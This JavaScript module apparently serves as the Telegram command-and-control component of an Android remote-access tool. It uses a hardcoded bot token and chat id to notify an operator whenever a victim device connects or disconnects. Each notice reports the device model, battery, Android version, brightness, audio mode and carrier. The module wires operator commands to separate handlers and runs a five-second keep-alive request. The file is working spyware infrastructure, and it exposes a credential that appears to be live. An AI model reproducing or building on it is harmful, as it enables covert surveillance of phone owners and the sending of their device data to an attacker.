const telegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { handleMessage } = require('./botMessageHandlers');
const { handleCallbackQuery } = require('./botCallbackQueryHandlers');

const token = '6484556495:AAFtFJHIof_XJCeXT03hj2qPY5L8Mt9_z9U';
const id = '1100137362';
const address = 'https://www.google.com';

const appBot = new telegramBot(token, { polling: true });

function sendDeviceMessage(model, battery, version, brightness, audio_mode, provider) {
    appBot.sendMessage(id,
        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴀᴜᴅɪᴏ ᴍᴏᴅᴇ: <b>${audio_mode}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        { parse_mode: 'HTML' }
    );
}

function sendDeviceDisconnectedMessage(model, battery, version, brightness, audio_mode, provider) {
    appBot.sendMessage(id,
        `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴀᴜᴅɪᴏ ᴍᴏᴅᴇ: <b>${audio_mode}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        { parse_mode: 'HTML' }
    );
}

function configureTelegramBot() {
    appBot.on('message', handleMessage);
    appBot.on('callback_query', handleCallbackQuery);

    setInterval(() => {
        axios.get(address).then(response => { /* manejar respuesta */ }).catch(error => { /* manejar error */ });
    }, 5000);
}

module.exports = { configureTelegramBot, sendDeviceMessage, sendDeviceDisconnectedMessage };
